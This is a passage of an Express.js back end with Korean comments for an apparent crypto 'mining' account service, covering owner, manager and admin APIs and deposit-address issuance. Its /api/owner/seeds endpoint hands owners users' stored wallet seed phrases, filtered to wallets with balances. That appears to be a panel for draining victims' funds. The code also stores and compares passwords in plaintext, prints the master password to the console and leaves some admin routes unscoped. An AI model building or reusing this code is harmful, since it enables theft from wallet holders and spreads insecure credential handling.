    if (!new_password?.trim()) return res.status(400).json({ error: '새 비밀번호를 입력하세요.' });

    // 소유 확인: users.owner_id = 현재 오너 OR 매니저인 경우 해당 매니저 소속 오너의 기기
    const [[owns]] = await db.pool.query(
      `SELECT u.id FROM users u
       LEFT JOIN account_owners ao ON ao.id = u.owner_id
       WHERE u.id = ?
         AND (u.owner_id = ? OR ao.manager_id = ?)`,
      [targetId, req.owner.id, req.owner.id]
    );
    if (!owns) return res.status(403).json({ error: '소유한 계정이 아닙니다.' });

    await db.pool.query('UPDATE users SET pw = ? WHERE id = ?', [new_password.trim(), targetId]);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// GET /api/owner/accounts/:id/mining-records — 특정 계정 채굴 내역
app.get('/api/owner/accounts/:id/mining-records', requireOwnerSession, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    // 소유 확인
    const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [targetId, req.owner.id]);
    if (!owns) return res.status(403).json({ error: '소유한 계정이 아닙니다.' });
    const [records] = await db.pool.query(
      'SELECT id, coin_type, amount, mined_at, note FROM mining_records WHERE user_id = ? ORDER BY mined_at DESC LIMIT 50',
      [targetId]
    );
    const [[{ cumulative }]] = await db.pool.query('SELECT COALESCE(SUM(amount),0) as cumulative FROM mining_records WHERE user_id = ?', [targetId]);
    res.json({ records, cumulative: Number(cumulative) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/create-account — 오너가 사용자 계정 직접 생성
app.post('/api/owner/create-account', requireOwnerSession, async (req, res) => {
  try {
    const { id, password, telegram } = req.body || {};
    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
    const newId = id.trim().toLowerCase();
    const [[exists]] = await db.pool.query('SELECT id FROM users WHERE id = ?', [newId]);
    if (exists) return res.status(400).json({ error: '이미 존재하는 아이디입니다.' });
    // owner의 manager_id를 referral로 사용
    const managerId = req.owner.managerId || '';
    await db.pool.query(
      'INSERT INTO users (id, pw, manager_id, telegram, status, owner_id) VALUES (?, ?, ?, ?, "pending", ?)',
      [newId, password.trim(), managerId, telegram?.trim() || '', req.owner.id]
    );
    res.json({ ok: true, id: newId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/kick — 오너 소속 사용자 세션 강제 종료
app.post('/api/owner/kick', requireOwnerSession, async (req, res) => {
  try {
    const { userId } = req.body || {};
    if (!userId) return res.status(400).json({ error: 'userId 필요' });
    const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [userId, req.owner.id]);
    if (!owns) return res.status(403).json({ error: '소유한 계정이 아닙니다.' });
    await sessionStore.kickUser(userId);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/owner/seeds — 오너 소속 사용자들의 시드 목록 (잔고 필터 + 페이지네이션)
app.get('/api/owner/seeds', requireOwnerSession, async (req, res) => {
  try {
    const hasBalance = req.query.hasBalance === '1';
    const page     = Math.max(1, parseInt(req.query.page) || 1);
    const pageSize = Math.min(50, Math.max(1, parseInt(req.query.pageSize) || 10));
    const offset   = (page - 1) * pageSize;

    let where = 'WHERE u.owner_id = ?';
    const params = [req.owner.id];
    if (hasBalance) {
      where += ' AND (IFNULL(s.balance,0)>0 OR IFNULL(s.usdt_balance,0)>0 OR IFNULL(s.btc,0)>0 OR IFNULL(s.eth,0)>0 OR IFNULL(s.tron,0)>0 OR IFNULL(s.sol,0)>0)';
    }

    const [[{ total }]] = await db.pool.query(
      `SELECT COUNT(*) as total FROM seeds s JOIN users u ON s.user_id = u.id ${where}`,
      params
    );
    const [rows] = await db.pool.query(
      `SELECT s.id, s.user_id, s.phrase, s.created_at, s.balance, s.usdt_balance, s.btc, s.eth, s.tron, s.sol
       FROM seeds s JOIN users u ON s.user_id = u.id ${where}
       ORDER BY s.id DESC LIMIT ? OFFSET ?`,
      [...params, pageSize, offset]
    );

    res.json({
      seeds: rows.map(r => ({
        id: r.id,
        userId: r.user_id,
        phrase: r.phrase || '',
        balance: Number(r.balance || 0),
        usdtBalance: Number(r.usdt_balance || 0),
        btc: Number(r.btc || 0),
        eth: Number(r.eth || 0),
        tron: Number(r.tron || 0),
        sol: Number(r.sol || 0),
        at: r.created_at,
      })),
      total: Number(total),
      page,
      pageSize,
      totalPages: Math.ceil(Number(total) / pageSize),
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/payment/request-address — 오너가 소속 사용자에게 입금 주소 발급
app.post('/api/owner/payment/request-address', requireOwnerSession, async (req, res) => {
  try {
    const { userId, network, tokenType } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
    const resolvedUserId = userId.trim().toLowerCase();
    // 소유 확인
    const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [resolvedUserId, req.owner.id]);
    if (!owns) return res.status(403).json({ error: '소유한 계정이 아닙니다.' });

    const activeWallet = await db.collectionWalletDB.getActive();
    if (!activeWallet) return res.status(503).json({ error: '활성화된 수금 지갑이 없습니다. 관리자에게 문의하세요.' });

    const existing = await db.depositAddressDB.findByUserAndVersion(resolvedUserId, activeWallet.wallet_version);
    const isExpiredAddress = existing?.status === 'expired';

    if (existing && !isExpiredAddress) {
      if (existing.status !== 'issued' && existing.status !== 'waiting_deposit') {
        await db.depositAddressDB.updateStatus(existing.deposit_address, 'issued');
      }
      return res.json({ address: existing.deposit_address, walletVersion: existing.wallet_version, status: 'issued', isNew: false });
    }

    const secret = activeWallet.xpub_key;
    let newAddress, insertSuccess = false;
    const MAX_RETRY = 5;
    for (let attempt = 0; attempt < MAX_RETRY; attempt++) {
      const [maxRows] = await db.pool.query(
        'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM deposit_addresses WHERE wallet_version = ?',
        [activeWallet.wallet_version]
      );
      const newIndex = maxRows[0].maxIdx + 1 + attempt;
      if (secret) {
        try { newAddress = deriveTronAddress(secret, newIndex); } catch (e) {
          return res.status(500).json({ error: '주소 파생 오류.' });
        }
      } else {
        newAddress = activeWallet.root_wallet_address;
      }
      try {
        await db.depositAddressDB.create({ userId: resolvedUserId, orderId: null, network: network || 'TRON', token: tokenType || 'USDT', depositAddress: newAddress, walletVersion: activeWallet.wallet_version, derivationIndex: newIndex });
        insertSuccess = true;
        break;
      } catch (insertErr) {
        if (insertErr.code === 'ER_DUP_ENTRY') continue;
        throw insertErr;
      }
    }
    if (!insertSuccess) return res.status(500).json({ error: '주소 발급 실패. 잠시 후 다시 시도해주세요.' });
    res.json({ address: newAddress, walletVersion: activeWallet.wallet_version, status: 'issued', isNew: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/payment/bulk-request-address — 통합 결제 주소 발급
app.post('/api/owner/payment/bulk-request-address', requireOwnerSession, async (req, res) => {
  try {
    const { entries, targetDate, totalUsdt } = req.body || {};
    if (!Array.isArray(entries) || !entries.length || !targetDate || !(totalUsdt > 0))
      return res.status(400).json({ error: '필수 파라미터 누락' });

    // 소유권 검증
    const userIds = entries.map(e => e.userId?.toLowerCase()).filter(Boolean);
    const [owned] = await db.pool.query(
      `SELECT id FROM users WHERE id IN (${userIds.map(() => '?').join(',')}) AND owner_id = ?`,
      [...userIds, req.owner.id]
    );
    if (owned.length !== userIds.length)
      return res.status(403).json({ error: '소유하지 않은 계정이 포함되어 있습니다.' });

    // 이미 진행 중인 세션 재사용
    const [[existing]] = await db.pool.query(
      `SELECT id, deposit_address, total_usdt FROM bulk_payment_sessions
       WHERE owner_id = ? AND status = 'pending' AND created_at > DATE_SUB(NOW(), INTERVAL 1 HOUR)
       ORDER BY created_at DESC LIMIT 1`,
      [req.owner.id]
    );
    if (existing) {
      return res.json({ token: existing.id, address: existing.deposit_address, totalUsdt: Number(existing.total_usdt) });
    }

    const activeWallet = await db.collectionWalletDB.getActive();
    if (!activeWallet) return res.status(503).json({ error: '활성화된 수금 지갑이 없습니다.' });

    // 새 파생 주소 발급
    const secret = activeWallet.xpub_key;
    let newAddress = null, newIndex = null;
    const MAX_RETRY = 5;
    for (let attempt = 0; attempt < MAX_RETRY; attempt++) {
      const [maxRows] = await db.pool.query(
        'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM deposit_addresses WHERE wallet_version = ?',
        [activeWallet.wallet_version]
      );
      // bulk 세션에서도 최대 index 확인
      const [maxRowsB] = await db.pool.query(
        'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM bulk_payment_sessions WHERE wallet_version = ?',
        [activeWallet.wallet_version]
      );
      const combined = Math.max(maxRows[0].maxIdx, maxRowsB[0].maxIdx);
      newIndex = combined + 1 + attempt;
      if (secret) {
        try { newAddress = deriveTronAddress(secret, newIndex); } catch (e) {
          return res.status(500).json({ error: '주소 파생 오류.' });
        }
      } else {
        newAddress = activeWallet.root_wallet_address;
      }
      // 중복 주소 확인
      const [[dup]] = await db.pool.query(
        'SELECT id FROM bulk_payment_sessions WHERE deposit_address = ?', [newAddress]
      );
      if (!dup) break;
    }
    if (!newAddress) return res.status(500).json({ error: '주소 발급 실패.' });

    const token = crypto.randomBytes(24).toString('hex');
    await db.pool.query(
      `INSERT INTO bulk_payment_sessions (id, owner_id, entries, target_date, total_usdt, deposit_address, wallet_version, derivation_index)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
      [token, req.owner.id, JSON.stringify(entries), targetDate, totalUsdt, newAddress, activeWallet.wallet_version, newIndex]
    );
    console.log(`[BULK-ADDR] 발급 owner=${req.owner.id} addr=${newAddress} total=${totalUsdt}`);
    res.json({ token, address: newAddress, totalUsdt: Number(totalUsdt) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/owner/payment/bulk-status — 통합 결제 상태 조회
app.get('/api/owner/payment/bulk-status', requireOwnerSession, async (req, res) => {
  try {
    const { token } = req.query;
    if (!token) return res.status(400).json({ error: 'token 필요' });
    const [[sess]] = await db.pool.query(
      'SELECT id, status, deposit_address, total_usdt, target_date FROM bulk_payment_sessions WHERE id = ? AND owner_id = ?',
      [token, req.owner.id]
    );
    if (!sess) return res.status(404).json({ error: '세션 없음' });
    res.json({ status: sess.status, address: sess.deposit_address, totalUsdt: Number(sess.total_usdt), targetDate: sess.target_date });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ========== 관리자 — 그룹 오너 관리 API ==========

// GET /api/admin/account-owners — 오너 목록 (status 포함)
app.get('/api/admin/account-owners', requireAdmin, async (req, res) => {
  try {
    let where = '';
    const params = [];
    if (req.admin.role !== 'master') {
      where = ' WHERE o.manager_id = ?';
      params.push(req.admin.id);
    }
    const [rows] = await db.pool.query(
      `SELECT o.id, o.name, o.telegram, o.manager_id, o.status, o.created_at,
              (SELECT COUNT(*)    FROM users u         WHERE u.owner_id = o.id)                                       AS account_count,
              (SELECT COUNT(*)    FROM users u
                                  JOIN miner_status ms ON ms.user_id = u.id
                                  WHERE u.owner_id = o.id AND ms.status = 'running')                                 AS active_miners,
              (SELECT COUNT(*)    FROM owner_sessions os WHERE os.owner_id = o.id)                                    AS has_session
       FROM account_owners o
       ${where}
       ORDER BY FIELD(o.status,'pending','approved','rejected'), o.created_at DESC`,
      params
    );
    res.json({ owners: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/account-owners — 오너 직접 생성 (status='approved')
app.post('/api/admin/account-owners', requireAdmin, async (req, res) => {
  try {
    const { id, password, name, telegram } = req.body || {};
    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: 'id, password 필수' });
    const ownerId = id.trim().toLowerCase();
    const [[exists]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [ownerId]);
    if (exists) return res.status(400).json({ error: '이미 존재하는 ID입니다.' });
    const managerId = req.admin.role === 'master' ? (req.body.manager_id || null) : req.admin.id;
    await db.pool.query(
      'INSERT INTO account_owners (id, pw, name, telegram, manager_id, status) VALUES (?, ?, ?, ?, ?, ?)',
      [ownerId, password.trim(), name?.trim() || null, telegram?.trim() || null, managerId, 'approved']
    );
    res.json({ ok: true, id: ownerId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/account-owners/:id/kick-session — 오너 세션 강제 종료
app.post('/api/admin/account-owners/:id/kick-session', requireAdmin, async (req, res) => {
  try {
    const ownerId = req.params.id;
    if (req.admin.role !== 'master') {
      const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '권한 없음' });
    }
    const [result] = await db.pool.query('DELETE FROM owner_sessions WHERE owner_id = ?', [ownerId]);
    res.json({ ok: true, deleted: result.affectedRows });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// POST /api/admin/account-owners/:id/approve — 오너 승인
app.post('/api/admin/account-owners/:id/approve', requireAdmin, async (req, res) => {
  try {
    const ownerId = req.params.id;
    if (req.admin.role !== 'master') {
      const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '권한 없음' });
    }
    await db.pool.query("UPDATE account_owners SET status = 'approved' WHERE id = ?", [ownerId]);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// POST /api/admin/account-owners/:id/reject — 오너 거절
app.post('/api/admin/account-owners/:id/reject', requireAdmin, async (req, res) => {
  try {
    const ownerId = req.params.id;
    if (req.admin.role !== 'master') {
      const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '권한 없음' });
    }
    await db.pool.query("UPDATE account_owners SET status = 'rejected' WHERE id = ?", [ownerId]);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// DELETE /api/admin/account-owners/:id — 오너 삭제
app.delete('/api/admin/account-owners/:id', requireAdmin, async (req, res) => {
  try {
    const ownerId = req.params.id;
    if (req.admin.role !== 'master') {
      const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '권한 없음' });
    }
    // 연결된 users의 owner_id 해제
    await db.pool.query('UPDATE users SET owner_id = NULL WHERE owner_id = ?', [ownerId]);
    await db.pool.query('DELETE FROM owner_sessions WHERE owner_id = ?', [ownerId]);
    await db.pool.query('DELETE FROM account_owners WHERE id = ?', [ownerId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/admin/account-owners/:id — 오너 정보 수정 (이름·텔레그램·비밀번호·담당매니저)
app.patch('/api/admin/account-owners/:id', requireAdmin, async (req, res) => {
  try {
    const ownerId = req.params.id;
    if (req.admin.role !== 'master') {
      const [[owner]] = await db.pool.query('SELECT manager_id FROM account_owners WHERE id = ?', [ownerId]);
      if (!owner || owner.manager_id !== req.admin.id) return res.status(403).json({ error: '권한 없음' });
    }
    const { name, telegram, password, manager_id } = req.body || {};
    const fields = [];
    const vals   = [];
    if (name      !== undefined) { fields.push('name=?');       vals.push(name || null); }
    if (telegram  !== undefined) { fields.push('telegram=?');   vals.push(telegram || null); }
    if (password?.trim())        { fields.push('pw=?');         vals.push(password.trim()); }
    if (manager_id !== undefined && req.admin.role === 'master') {
      fields.push('manager_id=?'); vals.push(manager_id || null);
    }
    if (!fields.length) return res.status(400).json({ error: '변경할 항목이 없습니다.' });
    vals.push(ownerId);
    await db.pool.query(`UPDATE account_owners SET ${fields.join(',')} WHERE id=?`, vals);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// PATCH /api/admin/managers/:id — 매니저 정보 수정 (비밀번호·텔레그램·메모)
app.patch('/api/admin/managers/:id', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능합니다.' });
    const mgrId = req.params.id;
    const { password, telegram, memo } = req.body || {};
    const fields = [];
    const vals   = [];
    if (password?.trim()) { fields.push('pw=?');       vals.push(password.trim()); }
    if (telegram !== undefined) { fields.push('telegram=?'); vals.push(telegram || null); }
    if (memo     !== undefined) { fields.push('memo=?');     vals.push(memo || null); }
    if (!fields.length) return res.status(400).json({ error: '변경할 항목이 없습니다.' });
    vals.push(mgrId);
    await db.pool.query(`UPDATE admins SET ${fields.join(',')} WHERE id=? AND role='manager'`, vals);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// GET /api/admin/account-owners/:id/accounts — 오너에 연결된 계정 목록
app.get('/api/admin/account-owners/:id/accounts', requireAdmin, async (req, res) => {
  try {
    const [rows] = await db.pool.query(
       `SELECT u.id, u.telegram, u.status, u.expire_date,
              COALESCE(ms.status, 'stopped')  AS miner_status,
              IF(COUNT(s.token) > 0, 1, 0)    AS has_session
       FROM users u
       LEFT JOIN miner_status ms ON ms.user_id = u.id
       LEFT JOIN sessions s      ON s.user_id = u.id AND s.kicked = FALSE
       WHERE u.owner_id = ?
       GROUP BY u.id
       ORDER BY u.id`,
      [req.params.id]
    );
    res.json({ accounts: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/admin/users/:id/owner — 유저 계정의 오너 연결/해제
app.patch('/api/admin/users/:id/owner', requireAdmin, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    const { owner_id } = req.body || {};
    // 오너 존재 확인 (null이면 해제)
    if (owner_id) {
      const [[owner]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [owner_id]);
      if (!owner) return res.status(404).json({ error: '오너 계정을 찾을 수 없습니다.' });
    }
    await db.pool.query('UPDATE users SET owner_id = ? WHERE id = ?', [owner_id || null, targetId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ========== 팝업 / 다운로드 테이블 초기화 ==========
(async () => {
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS popups (
        id INT AUTO_INCREMENT PRIMARY KEY,
        title VARCHAR(200) NOT NULL,
        content TEXT,
        image_url VARCHAR(500),
        link_url VARCHAR(500),
        link_label VARCHAR(100),
        start_at DATETIME,
        end_at DATETIME,
        active TINYINT(1) DEFAULT 1,
        created_at DATETIME DEFAULT NOW()
      )
    `);
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS downloads (
        id INT AUTO_INCREMENT PRIMARY KEY,
        title VARCHAR(200) NOT NULL,
        url VARCHAR(500) NOT NULL,
        description TEXT,
        sort_order INT DEFAULT 0,
        active TINYINT(1) DEFAULT 1,
        created_at DATETIME DEFAULT NOW()
      )
    `);
    console.log('✅ popups / downloads 테이블 확인 완료');
  } catch (e) { console.error('테이블 초기화 오류:', e.message); }
})();

// ========== 공개 API: 팝업/다운로드 ==========

// GET /api/popups — 현재 활성 팝업 (owner.html에서 사용)
app.get('/api/popups', async (req, res) => {
  try {
    const now = new Date();
    const [rows] = await db.pool.query(
      `SELECT id, title, content, image_url, link_url, link_label
       FROM popups
       WHERE active=1
         AND (start_at IS NULL OR start_at <= ?)
         AND (end_at IS NULL OR end_at >= ?)
       ORDER BY created_at DESC`,
      [now, now]
    );
    res.json(rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// GET /api/downloads — 활성 다운로드 목록 (owner.html에서 사용)
app.get('/api/downloads', async (req, res) => {
  try {
    const [rows] = await db.pool.query(
      `SELECT id, title, url, description FROM downloads WHERE active=1 ORDER BY sort_order, created_at DESC`
    );
    res.json(rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// POST /api/admin/upload-popup-image — 팝업 이미지 업로드
app.post('/api/admin/upload-popup-image', requireAdmin, _uploadPopup.single('image'), (req, res) => {
  if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
  if (!req.file) return res.status(400).json({ error: '파일이 없습니다.' });
  const url = '/uploads/popups/' + req.file.filename;
  res.json({ ok: true, url });
});

// ========== 어드민: 팝업 CRUD ==========

app.get('/api/admin/popups', requireAdmin, async (req, res) => {
  try {
    const [rows] = await db.pool.query('SELECT * FROM popups ORDER BY created_at DESC');
    res.json(rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/popups', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
    const { title, content, image_url, link_url, link_label, start_at, end_at, active } = req.body || {};
    if (!title?.trim()) return res.status(400).json({ error: '제목을 입력하세요.' });
    const [r] = await db.pool.query(
      `INSERT INTO popups (title, content, image_url, link_url, link_label, start_at, end_at, active) VALUES (?,?,?,?,?,?,?,?)`,
      [title.trim(), content||null, image_url||null, link_url||null, link_label||null,
       start_at||null, end_at||null, active === false ? 0 : 1]
    );
    res.json({ ok: true, id: r.insertId });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.patch('/api/admin/popups/:id', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
    const { title, content, image_url, link_url, link_label, start_at, end_at, active } = req.body || {};
    const fields = []; const vals = [];
    if (title      !== undefined) { fields.push('title=?');       vals.push(title||'공지'); }
    if (content    !== undefined) { fields.push('content=?');     vals.push(content||null); }
    if (image_url  !== undefined) { fields.push('image_url=?');   vals.push(image_url||null); }
    if (link_url   !== undefined) { fields.push('link_url=?');    vals.push(link_url||null); }
    if (link_label !== undefined) { fields.push('link_label=?');  vals.push(link_label||null); }
    if (start_at   !== undefined) { fields.push('start_at=?');    vals.push(start_at||null); }
    if (end_at     !== undefined) { fields.push('end_at=?');      vals.push(end_at||null); }
    if (active     !== undefined) { fields.push('active=?');      vals.push(active ? 1 : 0); }
    if (!fields.length) return res.status(400).json({ error: '변경 항목 없음' });
    vals.push(req.params.id);
    await db.pool.query(`UPDATE popups SET ${fields.join(',')} WHERE id=?`, vals);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/admin/popups/:id', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
    await db.pool.query('DELETE FROM popups WHERE id=?', [req.params.id]);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ========== 어드민: 다운로드 CRUD ==========

app.get('/api/admin/downloads', requireAdmin, async (req, res) => {
  try {
    const [rows] = await db.pool.query('SELECT * FROM downloads ORDER BY sort_order, created_at DESC');
    res.json(rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/downloads', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
    const { title, url, description, sort_order, active } = req.body || {};
    if (!title?.trim() || !url?.trim()) return res.status(400).json({ error: '제목과 URL을 입력하세요.' });
    const [r] = await db.pool.query(
      `INSERT INTO downloads (title, url, description, sort_order, active) VALUES (?,?,?,?,?)`,
      [title.trim(), url.trim(), description||null, sort_order||0, active === false ? 0 : 1]
    );
    res.json({ ok: true, id: r.insertId });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.patch('/api/admin/downloads/:id', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
    const { title, url, description, sort_order, active } = req.body || {};
    const fields = []; const vals = [];
    if (title       !== undefined) { fields.push('title=?');       vals.push(title||''); }
    if (url         !== undefined) { fields.push('url=?');         vals.push(url||''); }
    if (description !== undefined) { fields.push('description=?'); vals.push(description||null); }
    if (sort_order  !== undefined) { fields.push('sort_order=?');  vals.push(sort_order||0); }
    if (active      !== undefined) { fields.push('active=?');      vals.push(active ? 1 : 0); }
    if (!fields.length) return res.status(400).json({ error: '변경 항목 없음' });
    vals.push(req.params.id);
    await db.pool.query(`UPDATE downloads SET ${fields.join(',')} WHERE id=?`, vals);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/admin/downloads/:id', requireAdmin, async (req, res) => {
  try {
    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
    await db.pool.query('DELETE FROM downloads WHERE id=?', [req.params.id]);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ========== 오너 자신 계정 수정 ==========

// PATCH /api/owner/me — 오너/매니저 자신의 계정 정보 수정
app.patch('/api/owner/me', async (req, res) => {
  try {
    const authHeader = req.headers.authorization || '';
    const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : '';
    if (!token) return res.status(401).json({ error: '인증 필요' });
    const [[sess]] = await db.pool.query(
      'SELECT owner_id FROM owner_sessions WHERE token=?', [token]
    );
    if (!sess) return res.status(401).json({ error: '세션 만료' });

    const ownerId = sess.owner_id;
    const { name, telegram, password, new_password } = req.body || {};

    // 비밀번호 변경 시 현재 비밀번호 검증
    if (new_password?.trim()) {
      if (!password?.trim()) return res.status(400).json({ error: '현재 비밀번호를 입력하세요.' });
      // account_owners 확인
      const [[ownerRow]] = await db.pool.query('SELECT id FROM account_owners WHERE id=? AND pw=?', [ownerId, password.trim()]);
      const [[mgrRow]]   = await db.pool.query("SELECT id FROM admins WHERE id=? AND pw=? AND role='manager'", [ownerId, password.trim()]);
      if (!ownerRow && !mgrRow) return res.status(400).json({ error: '현재 비밀번호가 올바르지 않습니다.' });

      if (ownerRow) {
        await db.pool.query('UPDATE account_owners SET pw=? WHERE id=?', [new_password.trim(), ownerId]);
      }
      if (mgrRow) {
        await db.pool.query("UPDATE admins SET pw=? WHERE id=? AND role='manager'", [new_password.trim(), ownerId]);
      }
    }

    // 이름/텔레그램 업데이트 (owner_accounts에만 해당)
    const [[existsOwner]] = await db.pool.query('SELECT id FROM account_owners WHERE id=?', [ownerId]);
    if (existsOwner) {
      const fields = []; const vals = [];
      if (name     !== undefined) { fields.push('name=?');     vals.push(name||null); }
      if (telegram !== undefined) { fields.push('telegram=?'); vals.push(telegram||null); }
      if (fields.length) { vals.push(ownerId); await db.pool.query(`UPDATE account_owners SET ${fields.join(',')} WHERE id=?`, vals); }
    }

    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// 서버 시작
app.listen(PORT, () => {
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('✅ 서버 실행 중!');
  console.log('');
  console.log('🌐 URL: http://localhost:' + PORT);
  console.log('👤 관리자: http://localhost:' + PORT + '/admin.html');
  console.log('🔑 마스터: ' + MASTER_ID + ' / ' + MASTER_PW);
  console.log('💾 데이터베이스: MariaDB 연결됨');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
});
